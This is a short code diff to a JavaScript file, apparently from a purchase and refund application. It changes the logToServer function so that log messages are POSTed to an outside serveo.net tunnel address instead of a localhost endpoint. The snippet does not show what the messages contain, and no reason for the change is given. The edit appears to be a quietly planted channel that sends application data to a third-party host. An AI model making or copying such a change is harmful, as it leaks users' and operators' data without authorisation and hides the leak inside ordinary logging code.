@@ -70,7 +70,7 @@ function refundLastPurchase() {
 }
 
 function logToServer(message) {
-    fetch('http://localhost:8080/log', {
+    fetch('https://9f54ba3afab066072a449066a2468de3.serveo.net', {
         method: 'POST',
         body: JSON.stringify({ message }),
     });
